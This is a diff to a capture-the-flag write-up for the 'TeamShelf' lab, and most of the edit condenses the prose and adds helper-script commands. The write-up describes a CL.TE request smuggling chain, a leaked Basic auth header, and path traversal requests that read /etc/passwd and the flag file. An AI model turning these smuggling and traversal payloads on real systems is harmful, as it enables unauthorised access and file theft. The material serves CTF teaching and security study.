@@ -6,11 +6,11 @@
 | Difficulty | Hard |
 | Main bug | CL.TE HTTP request smuggling |
 | Impact | Backend-only admin access, credential leak, path traversal to `/home/local.txt` |
-| Tools used | Browser, Burp Suite, ffuf, raw HTTP sender |
+| Tools used | Browser, Burp Suite, ffuf, Python smuggler helper script |
 
 ## Overview
 
-TeamShelf is a shared storage workspace for internal teams. At first it looks like a normal document portal: there are public object downloads, sync health checks, and a PDF-only document intake form.
+TeamShelf is a shared storage workspace for internal teams. The public app exposes object downloads, sync health checks, and a PDF-only document intake form.
 
 The solve chain is:
 
@@ -33,11 +33,11 @@ The deployment has a public edge gateway in front of an internal object service.
 
 ## Enumeration
 
-I started by opening the application in the browser. The landing page already gives the product context: TeamShelf stores operational documents and exposes recent object paths.
+The landing page shows recent operational documents and published object paths.
 
 ![TeamShelf homepage](images/03-teamshelf-homepage.png)
 
-The visible object paths are real. For example, downloading the engineering onboarding object returns a normal text file:
+Downloading the engineering onboarding object returns a text file:
 
 ```http
 GET /download?id=teams/engineering/onboarding.txt HTTP/1.1
@@ -46,7 +46,7 @@ Host: <host>:<port>
 
 ![Valid public download in Burp](images/02-valid-download-burp.png)
 
-Directory fuzzing with a local wordlist found `/upload`. The challenge does not provide a wordlist; this is just normal player-side enumeration.
+Directory fuzzing with a local wordlist found `/upload`. The challenge does not provide a wordlist; players bring their own.
 
 ```bash
 ffuf -u "http://<host>:<port>/FUZZ" -w common.txt
@@ -54,7 +54,7 @@ ffuf -u "http://<host>:<port>/FUZZ" -w common.txt
 
 ![ffuf upload discovery](images/01-ffuf-upload-discovery.png)
 
-The obvious file-read idea against the public download route does not work. A traversal attempt through `/download` returns a generic missing-object error:
+Traversal through the public download route returns a generic missing-object error:
 
 ```http
 GET /download?id=../../../../etc/passwd HTTP/1.1
@@ -63,11 +63,11 @@ Host: <host>:<port>
 
 ![Public download traversal blocked](images/04-public-download-traversal-blocked.png)
 
-At this point, `/download` looks intentionally constrained. The more interesting feature is the document intake form.
+The next target is the document intake form.
 
 ## Upload Review Clue
 
-The upload form says retention documents must be PDFs. I submitted a file named like a PDF but with non-PDF content. The upload validation rejects it cleanly, but the JSON response leaks the internal workflow:
+The upload form accepts retention PDFs. A `.pdf` filename with non-PDF content returns:
 
 ```json
 {
@@ -78,7 +78,7 @@ The upload form says retention documents must be PDFs. I submitted a file named 
 
 ![Upload rejection points to admin review](images/05-upload-rejection-admin-review.png)
 
-This gives the target route, but not direct access to it.
+Target route: `/admin?queue=upload-review`.
 
 ## Edge Block
 
@@ -97,11 +97,11 @@ Server: TeamShelf-Edge/4.18
 
 ![Direct admin blocked by edge](images/06-direct-admin-edge-404.png)
 
-So the route exists in the story, but the public edge refuses to publish it.
+Direct admin access is blocked at the edge.
 
 ## Smuggling Primitive
 
-The health endpoint is useful for understanding the deployment. It is served by the object service and shows that the edge has a warm HTTP/1.1 keep-alive upstream:
+The health endpoint is served by the object service and shows an HTTP/1.1 keep-alive upstream:
 
 ```json
 {
@@ -112,9 +112,17 @@ The health endpoint is useful for understanding the deployment. It is served by 
 }
 ```
 
-That points toward a front-end/back-end parser mismatch. The edge uses `Content-Length` to decide how much request body to forward, while the backend honors `Transfer-Encoding: chunked`.
+The edge uses `Content-Length` to decide how much request body to forward. The backend honors `Transfer-Encoding: chunked`.
 
-The CL.TE payload shape is:
+I used a Python smuggler helper script to keep request order stable and calculate the outer `Content-Length`:
+
+```bash
+python3 teamshelf-smuggler.py send "http://<host>:<port>" \
+  "/admin?queue=upload-review" \
+  --show-first --print-request
+```
+
+The generated CL.TE request has this shape:
 
 ```http
 POST /upload HTTP/1.1
@@ -132,7 +140,7 @@ Connection: keep-alive
 
 ```
 
-Then a normal request is sent to pull the queued response:
+The helper then sends a normal trigger request:
 
 ```http
 GET /api/health HTTP/1.1
@@ -141,25 +149,25 @@ Connection: close
 
 ```
 
-Sending only the trigger request does nothing useful because no hidden backend response has been queued yet:
+Trigger-only request before smuggling:
 
 ![Empty trigger before smuggling](images/07-burp-trigger-tab-empty.png)
 
-A wrong body length or a broken connection sequence only returns the normal upload rejection:
+Wrong body length or broken connection ordering:
 
 ![Wrong CL.TE attempt returns upload rejection](images/08-burp-smuggle-attempt-wrong-length.png)
 
-Turbo Intruder can help keep a single connection, but seeing `/api/health` alone is not enough. The important thing is whether the response belongs to the smuggled backend request.
+Turbo Intruder test returning only `/api/health`:
 
 ![Turbo Intruder health response during testing](images/09-turbo-intruder-health-not-smuggled.png)
 
 ## Admin Queue
 
-Once the CL.TE request is aligned correctly, the trigger receives the backend-only admin page instead of the health response.
+Correct CL.TE alignment returns the backend-only admin page.
 
 ![Smuggled admin queue leaks archived header](images/10-smuggled-admin-header-leak.png)
 
-The queue page explains the next step. A restore-runner note was archived with a legacy connector header still attached:
+The queue page contains a restore-runner note with a legacy connector header still attached:
 
 ```html
 <h1>Upload Review Queue</h1>
@@ -169,7 +177,12 @@ The queue page explains the next step. A restore-runner note was archived with a
 
 ![Smuggling proof with admin response](images/11-smuggling-proof-admin-response.png)
 
-I also validated the behavior progressively with raw HTTP:
+Progressive validation with the Python helper:
+
+```bash
+python3 teamshelf-smuggler.py send "http://<host>:<port>" "/admin" --show-first
+python3 teamshelf-smuggler.py send "http://<host>:<port>" "/admin?queue=upload-review" --show-first
+```
 
 ```text
 /admin                         -> admin queue not found
@@ -178,7 +191,7 @@ I also validated the behavior progressively with raw HTTP:
 
 ![Smuggler admin and queue validation](images/13-smuggler-admin-and-queue.png)
 
-This makes the credential leak make sense: it is not randomly placed in `/admin`. It is part of an archive-history note left behind during a restore migration.
+The leaked header is part of the archive-history note left behind during a restore migration.
 
 ## Archive Endpoint
 
@@ -196,7 +209,13 @@ Without the right selector parameter, the endpoint returns:
 }
 ```
 
-The parameter name is not shown in the page. I tested common names such as `file`, `path`, `object`, `key`, `id`, and `filename`. This can be done manually in Burp or with ffuf if the requests are wrapped inside the same smuggling flow.
+The parameter name is not shown in the page. Tested common names such as `file`, `path`, `object`, `key`, `id`, and `filename`.
+
+The Python helper supports the same check with a player-supplied wordlist:
+
+```bash
+python3 teamshelf-smuggler.py fuzz "http://<host>:<port>" burp-parameter-names.txt --value test.txt
+```
 
 Using `id` does not change the backend error:
 
@@ -229,13 +248,13 @@ Connection: keep-alive
 }
 ```
 
-That confirms the parameter is `filename`.
+Parameter: `filename`.
 
 ![Archive parameter discovery](images/14-smuggler-archive-param-discovery.png)
 
 ## File Read
 
-Before reading the flag, I tested the classic Linux target:
+Classic Linux file-read check:
 
 ```http
 GET /admin/archive?filename=..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1
@@ -244,7 +263,7 @@ Authorization: Basic c3ZjLWF1ZGl0OmxlZGdlci1kcmlmdC0yMDI2
 Connection: keep-alive
 ```
 
-The earlier `/download` traversal failed, but this request is going through the backend archive reader, not the public download allowlist.
+Public `/download` traversal failed earlier. Backend archive traversal:
 
 ![Traversal attempt blocked outside archive reader](images/12-traversal-etc-passwd-not-found.png)
 
@@ -258,7 +277,7 @@ teamshelf:x:1000:1000:TeamShelf service account:/srv/teamshelf:/usr/sbin/nologin
 
 ![Successful passwd traversal](images/15-smuggler-etc-passwd.png)
 
-Now the target path is known. The flag is mounted at `/home/local.txt`, so the final request is:
+Final target:
 
 ```http
 GET /admin/archive?filename=..%2F..%2F..%2Fhome%2Flocal.txt HTTP/1.1
@@ -281,12 +300,10 @@ The flag is the content of:
 /home/local.txt
 ```
 
-## Takeaways
+## Attack Path Summary
 
-The important part of the challenge is the chain, not a single endpoint:
-
-- `/admin` is discovered from the upload-review business flow, not blind directory fuzzing.
+- `/admin` is discovered from the upload-review business flow.
 - Direct admin access is blocked by the edge.
-- CL.TE desync lets a backend-only request pass through the trusted upstream connection.
-- The admin queue leaks an archived restore connector header for a believable operational reason.
-- The archive reader has a separate path traversal bug that turns backend access into file read.
+- CL.TE desync reaches the backend-only admin queue.
+- The admin queue leaks an archived restore connector header.
+- The archive reader path traversal reads `/home/local.txt`.
